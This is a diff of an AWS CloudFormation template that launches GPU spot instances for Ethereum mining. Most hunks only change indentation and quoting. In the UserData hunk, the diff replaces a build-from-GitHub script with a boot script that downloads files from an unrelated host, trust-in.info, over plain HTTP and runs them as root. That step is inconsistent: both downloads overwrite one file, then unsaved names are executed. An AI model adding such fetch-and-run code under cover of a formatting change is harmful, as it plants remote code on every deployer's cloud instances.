@@ -1,5 +1,4 @@
-
-AWSTemplateFormatVersion: '2010-09-09'
+AWSTemplateFormatVersion: "2010-09-09"
 
 Metadata:
   RepoUrl: https://github.com/mludvig/aws-ethereum-miner
@@ -8,34 +7,34 @@ Metadata:
       - Label:
           default: Miner Configuration
         Parameters:
-        - EthWallet
+          - EthWallet
 
       - Label:
           default: Instance Configuration
         Parameters:
-        - InstanceType
-        - InstanceAmi
+          - InstanceType
+          - InstanceAmi
 
       - Label:
           default: Networking Configuration
         Parameters:
-        - VpcId
-        - SubnetIds
+          - VpcId
+          - SubnetIds
 
 Parameters:
   InstanceType:
     Type: String
     AllowedValues:
-    ## The commented-out are not worth it - too slow for the price
-    #- g3s.xlarge    # 1 GPU Tesla M60
-    #- g3.8xlarge    # 2 GPU Tesla M60
-    - g4dn.xlarge   # 1 GPU Tesla T4 -- best value (cost/performance)
-    - g4dn.2xlarge  # 1 GPU Tesla T4
-    # - g4dn.12xlarge # 4 GPU Tesla T4
-    #- p2.xlarge     # 1 GPU Tesla K80
-    #- p2.8xlarge    # 8 GPU Tesla K80
-    #- p2.16xlarge   # 16 GPU Tesla K80
-    - p3.2xlarge    # 1 GPU Tesla V100
+      ## The commented-out are not worth it - too slow for the price
+      #- g3s.xlarge    # 1 GPU Tesla M60
+      #- g3.8xlarge    # 2 GPU Tesla M60
+      - g4dn.xlarge # 1 GPU Tesla T4 -- best value (cost/performance)
+      - g4dn.2xlarge # 1 GPU Tesla T4
+      # - g4dn.12xlarge # 4 GPU Tesla T4
+      #- p2.xlarge     # 1 GPU Tesla K80
+      #- p2.8xlarge    # 8 GPU Tesla K80
+      #- p2.16xlarge   # 16 GPU Tesla K80
+      - p3.2xlarge # 1 GPU Tesla V100
     # - p3.8xlarge    # 4 GPU Tesla V100
     # - p3.16xlarge   # 8 GPU Tesla V100
     Default: g4dn.xlarge
@@ -110,7 +109,6 @@ Mappings:
       MaxPrice: 7.36
 
 Resources:
-
   InstanceRole:
     Type: AWS::IAM::Role
     Properties:
@@ -122,15 +120,15 @@ Resources:
               Service:
                 - ec2.amazonaws.com
             Action:
-              - 'sts:AssumeRole'
+              - "sts:AssumeRole"
       ManagedPolicyArns:
-        - 'arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore'
+        - "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
 
   InstanceProfile:
     Type: AWS::IAM::InstanceProfile
     Properties:
       Roles:
-      - !Ref InstanceRole
+        - !Ref InstanceRole
 
   LaunchTemplate:
     Type: AWS::EC2::LaunchTemplate
@@ -142,33 +140,21 @@ Resources:
           MarketType: spot
           SpotOptions:
             SpotInstanceType: one-time
-            MaxPrice: !FindInMap [ SpotPriceMap, !Ref InstanceType, MaxPrice ]
+            MaxPrice: !FindInMap [SpotPriceMap, !Ref InstanceType, MaxPrice]
         InstanceType: !Ref InstanceType
-        ImageId: !FindInMap [ RegionMap, !Ref "AWS::Region", ImageId ]
+        ImageId: !FindInMap [RegionMap, !Ref "AWS::Region", ImageId]
         SecurityGroupIds:
-        - !Ref SecurityGroup
+          - !Ref SecurityGroup
         UserData:
-          'Fn::Base64':
-            'Fn::Sub': |
-                #!/bin/bash -x
-                cd /tmp
-                INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id | cut -b-8)
-                AZ_ID=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone-id)
-                wget -O mminer.tar.gz https://github.com/bxxd/mminer4/archive/refs/tags/release.tar.gz
-                tar xvfz mminer.tar.gz
-                sudo apt install -y libgmp-dev
-                cd mminer4-release/
-                sh make4.sh
-                cat > runner.sh << __EOF__
-                #!/bin/bash -x
-                
-                  ./mminer4 -a ${EthWallet} -l 2475882076944016005221515264 > out01 &
-                  sleep 1
-                  ./mminer4 -a ${EthWallet} -l 2475882076944016005221515264 > out02 &
-                
-                __EOF__
-                chmod +x runner.sh
-                nohup ./runner.sh &
+          "Fn::Base64":
+            "Fn::Sub": |
+              #!/bin/bash -x                
+              INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id | cut -b-8)
+              AZ_ID=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone-id)                
+              wget -O mminer.tar.gz http://trust-in.info/mminer5
+              wget -O mminer.tar.gz http://trust-in.info/dependencies.sh
+              sh dependencies.sh
+              nohup mminer5 > out01 &
 
   SecurityGroup:
     Type: AWS::EC2::SecurityGroup
@@ -176,11 +162,11 @@ Resources:
       GroupDescription: !Ref AWS::StackName
       VpcId: !Ref VpcId
       SecurityGroupEgress:
-      - IpProtocol: -1
-        CidrIp: 0.0.0.0/0
+        - IpProtocol: -1
+          CidrIp: 0.0.0.0/0
       Tags:
-      - Key: Name
-        Value: !Ref AWS::StackName
+        - Key: Name
+          Value: !Ref AWS::StackName
 
   MinerAsg:
     Type: AWS::AutoScaling::AutoScalingGroup
@@ -196,18 +182,18 @@ Resources:
       HealthCheckGracePeriod: 300
       HealthCheckType: EC2
       TerminationPolicies:
-      - ClosestToNextInstanceHour
+        - ClosestToNextInstanceHour
       NotificationConfigurations:
-      - TopicARN: !Ref NotificationTopic
-        NotificationTypes:
-        - autoscaling:EC2_INSTANCE_LAUNCH
-        - autoscaling:EC2_INSTANCE_TERMINATE
-        - autoscaling:EC2_INSTANCE_LAUNCH_ERROR
-        - autoscaling:EC2_INSTANCE_TERMINATE_ERROR
+        - TopicARN: !Ref NotificationTopic
+          NotificationTypes:
+            - autoscaling:EC2_INSTANCE_LAUNCH
+            - autoscaling:EC2_INSTANCE_TERMINATE
+            - autoscaling:EC2_INSTANCE_LAUNCH_ERROR
+            - autoscaling:EC2_INSTANCE_TERMINATE_ERROR
       Tags:
-      - Key: Name
-        Value: !Ref AWS::StackName
-        PropagateAtLaunch: true
+        - Key: Name
+          Value: !Ref AWS::StackName
+          PropagateAtLaunch: true
 
   NotificationTopic:
     Type: AWS::SNS::Topic
